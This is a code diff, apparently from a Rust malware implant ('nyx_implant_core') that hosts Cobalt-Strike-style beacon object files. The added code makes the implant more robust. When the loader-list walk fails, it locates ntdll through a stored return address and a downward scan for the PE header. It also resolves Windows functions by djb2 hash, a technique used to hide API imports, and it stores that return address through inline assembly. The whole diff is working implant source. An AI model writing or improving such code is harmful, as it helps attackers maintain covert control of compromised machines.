@@ -174,6 +174,42 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         options(nostack, preserves_flags, readonly),
     );
     if base == 0 {
+        // Ldr walk failed; locate ntdll from the thread's return address
+        // (RtlUserThreadStart lives inside ntdll) and scan downward for the
+        // MZ/PE header — no unmapped reads (the scan stays within ntdll).
+        let ret: usize;
+        core::arch::asm!(
+            "mov {}, gs:[0x1798]",
+            out(reg) ret,
+            options(nostack, preserves_flags, readonly),
+        );
+        let mut cand = (ret & !0xFFF) as *mut u8;
+        for _ in 0..0x2000 {
+            let mz = unsafe { *(cand as *const u16) };
+            if mz == 0x5A4D {
+                let e = unsafe { *(cand.add(0x3C) as *const i32) } as usize;
+                if e < 0x1000 {
+                    let pe = unsafe { *(cand.add(e) as *const u32) };
+                    if pe == 0x0000_4550 {
+                        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+                            cand,
+                            nyx_implant_core::resolve::djb2(func),
+                        ) {
+                            return Some(r);
+                        }
+                        if lower != func {
+                            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+                                cand,
+                                nyx_implant_core::resolve::djb2(lower),
+                            ) {
+                                return Some(r);
+                            }
+                        }
+                    }
+                }
+            }
+            cand = cand.sub(0x1000);
+        }
         stamp_diag(0xC5);
         return None;
     }
@@ -210,6 +246,22 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
 /// built it; the length caps below reject absurd values).
 #[no_mangle]
 pub unsafe extern "C" fn nyx_bof_host_entry(packed: *const u8) -> ! {
+    // Stash the caller's return address (RtlUserThreadStart, in ntdll) at
+    // gs:[0x1798] — the fallback export resolution uses it to locate ntdll
+    // without the PEB/Ldr walk (24H2 Ldr layout drift broke the walk).
+    {
+        let ret: usize;
+        core::arch::asm!(
+            "mov {}, [rsp + 0x28]",
+            out(reg) ret,
+            options(nostack, preserves_flags, readonly),
+        );
+        core::arch::asm!(
+            "mov qword ptr gs:[0x1798], {}",
+            in(reg) ret,
+            options(nostack, preserves_flags),
+        );
+    }
     // Keep the indirectly-reached Beacon-API shims inside the dumper's
     // reachability closure (never executes at runtime — see shim_keepalive).
     shim_keepalive(packed);
